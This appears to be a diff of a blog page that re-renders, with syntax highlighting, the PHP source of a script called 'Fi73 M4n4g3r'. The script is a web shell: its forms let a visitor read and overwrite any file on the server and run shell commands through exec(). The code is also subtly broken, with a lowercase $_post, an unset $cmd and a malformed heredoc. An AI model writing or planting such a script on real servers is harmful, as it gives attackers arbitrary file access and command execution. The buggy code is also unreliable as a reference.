@@ -37,74 +37,73 @@
 
 <h3>Fi73 M4n4g3r script source code</h3>
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;?php
-$file = $error = $file_content = "";
-if(isset($_POST["file"]) and (isset($_POST["modify"]))){
+<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$error</span> <span class="o">=</span> <span class="nv">$file_content</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;modify&quot;</span><span class="p">]))){</span>
 
-    $file = $_POST["file"];
-    if(! file_exists("$file")) 
-    {
-        $error = "File $file doesnt exist!";
-    }
-    else
-    {
-        $file_content = "&lt;&lt;&lt;_END";
-        echo "&lt;PRE&gt;";
-        echo "file_get_contents($file)";
-        echo "&lt;/PRE&gt;";
-        _END;
-    }
-}
-if(isset($_POST["file"]) and (isset($_POST["modify"])))
-{
-    $file = $_POST["file"];
-    $text = $file_content = $_POST["modify"];
-    $fh = fopen("$file" , "r+");
-    if(! fwrite($fh , $text))
-    {
-        $error = "File $file couldnt be overwritten!";
-    }
-    else $error = "file $file successfully overwritten!";
-    fclose($fh);
-}
-if(isset($_post["cmd"]))
-{
-    exec($cmd, $output, $status);
-    if($status) echo "command failed!";
-    else
-    {
-        echo "&lt;pre&gt;";
-    foreach ($output as $line) echo "$line \n";
-    }
-}
-echo &lt;&lt;&lt;_END
-&lt;HTML&gt;
-&lt;HEAD&gt;
-&lt;TITLE&gt;File manager&lt;/TITLE&gt;
-&lt;/HEAD&gt;
-&lt;BODY&gt;
-&lt;CENTER&gt;&lt;H3&gt;Fi73 M4n4g3r&lt;/H3&gt;&lt;/CENTER&gt; 
-$error &lt;BR /&gt;
-&lt;form method = "post" action = "modifier.php"&gt;
-&lt;input type = "text" name = "file" /&gt;
-&lt;input type = "submit" value = "Get File"/&gt;
-&lt;/form&gt;
-&lt;form method = "post" action = "modifier.php"&gt;
-&lt;textarea name = "modify" wrap = "off" cols = "15" rows = "20"&gt;
-$file_content &lt;/textarea&gt;
-&lt;input type = "hidden" name = "file" value = "$file" /&gt;
-&lt;input type = "submit" value ="save changes" /&gt;
-&lt;/form&gt;
-&lt;form method ="post" action = "modifier.php"&gt;
-&lt;input type = "text" name = "cmd" /&gt;
-&lt;input type = "submit" value = "execute command"/&gt;
-&lt;/form&gt;
-&lt;/CENTER&gt;
-&lt;/BODY&gt;
-&lt;/HTML&gt;
-_END;
-?&gt;
-</pre>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nb">file_exists</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$file</span><span class="s2">&quot;</span><span class="p">))</span> 
+    <span class="p">{</span>
+        <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;File </span><span class="si">$file</span><span class="s2"> doesnt exist!&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="nv">$file_content</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;&amp;lt;&amp;lt;_END&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;PRE&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;file_get_contents(</span><span class="si">$file</span><span class="s2">)&quot;</span><span class="p">;</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/PRE&amp;gt;&quot;</span><span class="p">;</span>
+        <span class="nx">_END</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">])</span> <span class="k">and</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;modify&quot;</span><span class="p">])))</span>
+<span class="p">{</span>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;file&quot;</span><span class="p">];</span>
+    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$file_content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;modify&quot;</span><span class="p">];</span>
+    <span class="nv">$fh</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$file</span><span class="s2">&quot;</span> <span class="p">,</span> <span class="s2">&quot;r+&quot;</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fh</span> <span class="p">,</span> <span class="nv">$text</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;File </span><span class="si">$file</span><span class="s2"> couldnt be overwritten!&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="nv">$error</span> <span class="o">=</span> <span class="s2">&quot;file </span><span class="si">$file</span><span class="s2"> successfully overwritten!&quot;</span><span class="p">;</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_post</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]))</span>
+<span class="p">{</span>
+    <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$output</span><span class="p">,</span> <span class="nv">$status</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$status</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;command failed!&quot;</span><span class="p">;</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;pre&amp;gt;&quot;</span><span class="p">;</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$output</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$line</span><span class="s2"> </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">echo</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">_END</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">HTML</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">HEAD</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">TITLE</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">File</span> <span class="nx">manager</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">TITLE</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">HEAD</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">BODY</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">CENTER</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">H3</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">Fi73</span> <span class="nx">M4n4g3r</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">H3</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">CENTER</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> 
+<span class="nv">$error</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">BR</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span> <span class="o">=</span> <span class="s2">&quot;post&quot;</span> <span class="nx">action</span> <span class="o">=</span> <span class="s2">&quot;modifier.php&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;text&quot;</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&quot;file&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;submit&quot;</span> <span class="nx">value</span> <span class="o">=</span> <span class="s2">&quot;Get File&quot;</span><span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">form</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span> <span class="o">=</span> <span class="s2">&quot;post&quot;</span> <span class="nx">action</span> <span class="o">=</span> <span class="s2">&quot;modifier.php&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">textarea</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&quot;modify&quot;</span> <span class="nx">wrap</span> <span class="o">=</span> <span class="s2">&quot;off&quot;</span> <span class="nx">cols</span> <span class="o">=</span> <span class="s2">&quot;15&quot;</span> <span class="nx">rows</span> <span class="o">=</span> <span class="s2">&quot;20&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="nv">$file_content</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">textarea</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&quot;file&quot;</span> <span class="nx">value</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$file</span><span class="s2">&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;submit&quot;</span> <span class="nx">value</span> <span class="o">=</span><span class="s2">&quot;save changes&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">form</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">form</span> <span class="nx">method</span> <span class="o">=</span><span class="s2">&quot;post&quot;</span> <span class="nx">action</span> <span class="o">=</span> <span class="s2">&quot;modifier.php&quot;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;text&quot;</span> <span class="nx">name</span> <span class="o">=</span> <span class="s2">&quot;cmd&quot;</span> <span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">input</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&quot;submit&quot;</span> <span class="nx">value</span> <span class="o">=</span> <span class="s2">&quot;execute command&quot;</span><span class="o">/&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">form</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">CENTER</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">BODY</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">/</span><span class="nx">HTML</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span>
+<span class="nx">_END</span><span class="p">;</span>
+<span class="cp">?&gt;</span><span class="x"></span></code></pre></div>
 
 <p>A screenshot of this very plain and boring looking script:<figure id="attachment_390" style="width: 537px;" class="wp-caption aligncenter"></p>
 
